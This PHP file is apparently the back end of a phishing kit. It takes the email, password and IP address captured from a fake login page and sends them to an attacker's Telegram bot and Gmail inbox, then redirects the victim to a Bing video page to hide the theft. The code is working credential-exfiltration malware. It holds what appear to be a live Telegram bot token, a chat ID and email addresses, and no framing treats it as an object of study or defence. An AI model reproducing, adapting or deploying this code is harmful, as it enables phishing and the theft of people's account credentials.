<?php
// Start session
if (!isset($_SESSION)) {
    session_start();
}

// Configuration
$TARGET_URL = "https://www.bing.com/videos/riverview/relatedvideo?q=team+meeting&mid=06C0E4192AA37E48CEC406C0E4192AA37E48CEC4&FORM=VIRE";

// Telegram Bot Config
$TELEGRAM_BOT_TOKEN = "5618258723:AAEnMf0Ote1jgtEoKEaNstoWhepza9vprDo"; // e.g., 123456789:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
$TELEGRAM_CHAT_ID = "1376032111"; // e.g., -1001234567890

// Email Config - USE A REAL EMAIL FROM YOUR DOMAIN
$TO_EMAIL = "oneworldcybercaf@gmail.com"; // Change to your real email
$EMAIL_SUBJECT = "Login Attempt Captured - " . date('Y-m-d H:i:s');
$FROM_EMAIL = "resk383@capitalfcunion.com"; // Use your actual domain

// Check if login data exists in session
if (isset($_SESSION['login_data'])) {
    $login_data = $_SESSION['login_data'];
    $email = $login_data['email'];
    $password = $login_data['password'];
    $ip = $login_data['ip'];
    
    unset($_SESSION['login_data']);
    
    $message = "Login Attempt Captured:\n\n";
    $message .= "Email: $email\n";
    $message .= "Password: $password\n";
    $message .= "Time: " . date('Y-m-d H:i:s') . "\n";
    $message .= "IP Address: $ip\n";
    $message .= "User Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "\n";

    // Send to Telegram
    $telegramSent = sendToTelegram($message, $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID);

    // Send to Email with error handling
    $emailSent = sendEmail($TO_EMAIL, $EMAIL_SUBJECT, $message, $FROM_EMAIL);
    
    // Debug: Log the attempt (remove this in production)
    error_log("Login capture attempt - Email: $email, Telegram: " . ($telegramSent ? 'Yes' : 'No') . ", Email: " . ($emailSent ? 'Yes' : 'No'));
}

// Redirect to target URL
header("Location: $TARGET_URL");
exit;

function sendToTelegram($message, $botToken, $chatId) {
    if (!$botToken || !$chatId) {
        error_log("Telegram: Missing bot token or chat ID");
        return false;
    }

    try {
        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        $options = [
            'http' => [
                'method' => 'POST',
                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
                'content' => http_build_query($data),
                'timeout' => 10
            ]
        ];

        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
        
        if ($result === FALSE) {
            error_log("Telegram: Failed to send message");
            return false;
        }
        
        return true;
    } catch (Exception $e) {
        error_log("Telegram Error: " . $e->getMessage());
        return false;
    }
}

function sendEmail($to, $subject, $message, $from) {
    if (!$to || !$from) {
        error_log("Email: Missing to or from address");
        return false;
    }

    // Validate email format
    if (!filter_var($to, FILTER_VALIDATE_EMAIL) || !filter_var($from, FILTER_VALIDATE_EMAIL)) {
        error_log("Email: Invalid email format - To: $to, From: $from");
        return false;
    }

    // Proper headers
    $headers = "From: $from\r\n";
    $headers .= "Reply-To: $from\r\n";
    $headers .= "Return-Path: $from\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion();

    try {
        // Use additional parameters for better delivery
        $additional_parameters = "-f $from";
        $sent = mail($to, $subject, $message, $headers, $additional_parameters);
        
        if (!$sent) {
            error_log("Email: mail() function returned false");
            return false;
        }
        
        error_log("Email: Successfully sent to $to");
        return true;
    } catch (Exception $e) {
        error_log("Email Error: " . $e->getMessage());
        return false;
    }
}
?>

































